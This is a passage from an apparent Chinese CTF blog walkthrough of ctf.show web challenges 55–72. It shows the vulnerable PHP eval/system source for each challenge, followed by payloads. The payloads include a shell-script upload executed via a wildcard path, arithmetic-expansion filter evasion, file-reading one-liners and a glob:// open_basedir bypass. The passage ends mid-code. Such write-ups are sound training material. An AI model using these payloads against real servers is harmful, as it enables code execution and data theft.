class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://10a25f77-7366-42e5-9334-449a03fe2086.challenge.ctf.show/&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上传文件到该网页并抓包，修改文件内容为shell脚本格式</p><p>并且get传参使用点 . 去执行该文件</p><img src="https://s2.loli.net/2022/12/24/YcjiZqfnNKhJxTe.png" alt="image-20221224101228694" style="zoom:33%;" /><p>get传参：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=.+/???/????????[@-[]<br><span class="hljs-comment">// +代表空格在url中， 最后的[@-[] 是linux下的通配符，去匹配大写字母</span><br><span class="hljs-comment">//意思就是通过 .(source)  去执行/tmp/php?????? 中我们上传的文件中的shell脚本</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/24/5YGIxtPVQolJKZh.png" alt="img"></p><h3 id="web56"><a href="#web56" class="headerlink" title="web56"></a>web56</h3><p>同上</p><h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 还能炫的动吗？</span><br><span class="hljs-comment">//flag in 36.php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>观察题目可知，我们只需要构造出36即可</p><p>查阅资料可知：</p><blockquote><p>linux中</p><p><strong>${_}</strong>&#x3D;””&#x2F;&#x2F;返回上一次的执行结果，如果没有上一次执行结果就返回空</p><p><strong>$(())&#x3D;0</strong></p><p><strong>$(( ~$(()) )) &#x3D; $((-1)) &#x3D; -1</strong></p><p>$(()) 是 用来做整数运算的命令，内部可以放表达式，<strong>默认相加</strong></p></blockquote><p>我们可以通过 $((~-37)) &#x3D; 36  对-37取反可得36</p><p>于是， $(( ~$((  )) )) 在括号内部放入 37个 $(( ~$(()) )) 即-1，默认相加等于 -37 ，再取反得到36</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?c=<br>$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))<br></code></pre></td></tr></table></figure><p>太牛了这思路</p><h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>首先我们需要获取flag所在路径：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)));<br>c=<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())));<br><br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-string">&#x27;.&#x27;</span>);<span class="hljs-keyword">while</span>((<span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$a</span>))!=<span class="hljs-literal">false</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>;&#125;<br></code></pre></td></tr></table></figure><h4 id="opendir"><a href="#opendir" class="headerlink" title="opendir()"></a>opendir()</h4><blockquote><p>opendir() 函数打开目录句柄。</p></blockquote><h4 id="readdirr"><a href="#readdirr" class="headerlink" title="readdirr()"></a>readdirr()</h4><blockquote><p>readdir() 函数返回目录中下一个文件的文件名。</p></blockquote><p>方法一:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//通过高亮文件去读取文件内容</span><br>c=<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p>方法二：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//通过函数去读取文件内容</span><br>c=<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);   <span class="hljs-comment">//该函数将文件读入字符串中</span><br>c=<span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>));<br>c=<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>));<br>c=<span class="hljs-title function_ invoke__">var_export</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>));<br></code></pre></td></tr></table></figure><h4 id="readfile"><a href="#readfile" class="headerlink" title="readfile()"></a>readfile()</h4><blockquote><p>readfile() 函数读取一个文件，并写入到<strong>输出缓冲</strong>。</p><p>如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 ‘@’ 来隐藏错误输出。</p></blockquote><h4 id="file"><a href="#file" class="headerlink" title="file()"></a>file()</h4><blockquote><p>file() 函数把整个文件<strong>读入一个数组</strong>中。</p><p>数组中的每个元素都是文件中相应的一行，包括换行符在内。</p></blockquote><h4 id="var-export"><a href="#var-export" class="headerlink" title="var_export()"></a>var_export()</h4><blockquote><p><strong>var_export()</strong> 函数用于输出或返回一个变量，以字符串形式表示。</p><p><strong>var_export()</strong> 函数返回关于传递给该函数的变量的结构信息，它和 <a href="https://www.runoob.com/php/php-var_dump-function.html">var_dump()</a> 类似，不同的是其返回的是一个合法的 PHP 代码。</p></blockquote><p>方法三</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">通过fopen去读取文件内容，这里介绍下函数<br><span class="hljs-title function_ invoke__">fread</span>()<br><span class="hljs-title function_ invoke__">fgets</span>()<br><span class="hljs-title function_ invoke__">fgetc</span>()<br><span class="hljs-title function_ invoke__">fgetss</span>()<br><span class="hljs-title function_ invoke__">fgetcsv</span>()<br><span class="hljs-title function_ invoke__">gpassthru</span>()<br>payload:<br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$a</span>)) &#123;<span class="hljs-variable">$line</span> = <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$line</span>;&#125;<span class="hljs-comment">//一行一行读取</span><br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$a</span>)) &#123;<span class="hljs-variable">$line</span> = <span class="hljs-title function_ invoke__">fgetc</span>(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$line</span>;&#125;<span class="hljs-comment">//一个一个字符读取</span><br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$a</span>)) &#123;<span class="hljs-variable">$line</span> = <span class="hljs-title function_ invoke__">fgetcsv</span>(<span class="hljs-variable">$a</span>);<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$line</span>);&#125;<br><br></code></pre></td></tr></table></figure><h3 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h3><p>通过 <code>c=print_r(scandir(&#39;.&#39;))</code> 找到flag.php在当前目录下</p><p>readfile() 、file_get_contents()被禁用了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//paylaod汇总</span><br>c=<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>c=<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-string">&quot;flag.php&quot;</span>)); <br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$a</span>)) &#123;<span class="hljs-variable">$line</span> = <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$line</span>;&#125;<br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$a</span>)) &#123;<span class="hljs-variable">$line</span> = <span class="hljs-title function_ invoke__">fgetc</span>(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$line</span>;&#125;<br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$a</span>)) &#123;<span class="hljs-variable">$line</span> = <span class="hljs-title function_ invoke__">fgetcsv</span>(<span class="hljs-variable">$a</span>);<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$line</span>);&#125;<br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;1000&quot;</span>);<br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fpassthru</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><h4 id="fpassthru"><a href="#fpassthru" class="headerlink" title="fpassthru()"></a>fpassthru()</h4><blockquote><p>fpassthru() 函数输出文件指针处的所有剩余数据。</p><p>该函数将给定的文件指针从当前的位置读取到 EOF，并把结果写到输出缓冲区。</p></blockquote><h3 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h3><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>);<span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$a</span>))&#123;<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgetc</span>(<span class="hljs-variable">$a</span>);&#125;<br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>);<span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$a</span>))&#123;<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">fgetcsv</span>(<span class="hljs-variable">$a</span>));&#125;<br></code></pre></td></tr></table></figure><h4 id="fgetcsv"><a href="#fgetcsv" class="headerlink" title="fgetcsv"></a>fgetcsv</h4><blockquote><p>fgetcsv() 函数从文件指针中读入一行并解析 CSV 字段。</p><p>与 <a href="https://www.w3school.com.cn/php/func_filesystem_fgets.asp">fgets()</a> 类似，不同的是 fgetcsv() 解析读入的行并找出 CSV 格式的字段，</p><p>返回一个包含这些字段的<strong>数组</strong>。 </p></blockquote><p>解法二：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>,<span class="hljs-string">&#x27;flag.txt&#x27;</span>);<span class="hljs-comment">//使用copy函数复制一份内容内txt，直接访问/flag.txt即可</span><br>c=<span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>,<span class="hljs-string">&#x27;flag.txt&#x27;</span>);   <span class="hljs-comment">//重命名flag.php</span><br></code></pre></td></tr></table></figure><h3 id="web61-65"><a href="#web61-65" class="headerlink" title="web61-65"></a>web61-65</h3><p>查找目录payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-string">&#x27;.&#x27;</span>);<span class="hljs-keyword">while</span>((<span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$a</span>))!==<span class="hljs-literal">false</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;&#125;<br>c=<span class="hljs-title function_ invoke__">var_export</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;.&#x27;</span>));<br>c=<span class="hljs-title function_ invoke__">var_export</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)));<br>c=<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">pos</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//payload:</span><br>c=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br></code></pre></td></tr></table></figure><h3 id="web66-67"><a href="#web66-67" class="headerlink" title="web66-67"></a>web66-67</h3><p>查找目录:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-string">&#x27;/&#x27;</span>);<span class="hljs-keyword">while</span>((<span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$a</span>))!==<span class="hljs-literal">false</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;&#125;<br>c=<span class="hljs-title function_ invoke__">var_export</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>c=<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/flag.txt&#x27;</span>;  <span class="hljs-comment">//使用文件包含</span><br>c=<span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="web68-70"><a href="#web68-70" class="headerlink" title="web68-70"></a>web68-70</h3><p>扫描目录:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-title function_ invoke__">var_export</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<br>c=<span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///*&#x27;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&quot; &quot;</span>);&#125;<br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/flag.txt&#x27;</span>;  <span class="hljs-comment">//使用文件包含</span><br>c=<span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>c=<span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br>你要上天吗？<br></code></pre></td></tr></table></figure><p>我们发现了不认识的函数，查阅资料：</p><h4 id="ob-get-contents"><a href="#ob-get-contents" class="headerlink" title="ob_get_contents()"></a>ob_get_contents()</h4><blockquote><p>ob_get_contents() — 返回输出缓冲区的内容，或者如果输出缓冲区无效将返回<code>FALSE</code> 。</p><p>只是得到输出缓冲区的内容，但不清除它。</p></blockquote><h4 id="ob-end-clean"><a href="#ob-end-clean" class="headerlink" title="ob_end_clean()"></a>ob_end_clean()</h4><blockquote><p> ob_end_clean() — 清空（擦除）缓冲区并关闭输出缓冲 </p></blockquote><p>由上可知，我们通过查询的值会存入缓冲区中，然后$s就是缓冲区的内容，但是最后输出的时候会把内容替换为？。所以我们只需要查询完之后结束后面的代码执行即可将内容显示出来</p><p>我们可以使用 <strong>exit()</strong>  <strong>die()</strong>  函数结束接下来的语句执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//payload</span><br>c=<span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>c=<span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<span class="hljs-keyword">die</span>();<br></code></pre></td></tr></table></figure><h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><p>我们使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-title function_ invoke__">var_export</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>去扫描目录，发现没有权限</p><p>但是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-title function_ invoke__">var_export</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;.&#x27;</span>));<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>可以，于是我们猜测，可能是开启了 open_basedir</p><h4 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h4><blockquote><p>open_basedir可将用户访问文件的活动范围限制在指定的区域,通常是其家目录的路径,</p><p>也 可用符号”.”来代表当前目录,注意用open_basedir指定的限制实际上是前缀,而不是目录名.</p></blockquote><p>于是我们需要绕过它，此处禁用了命令执行函数，所以不能这么绕</p><blockquote><p><strong>glob</strong>是php自5.3.0版本起开始生效的一个用来筛选目录的伪协议，</p><p>它在筛选目录时是不受 open_basedir 的制约的，</p></blockquote><p>所以我们可以利用它来绕过限制，</p><p>(需要 url编码 后使用)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 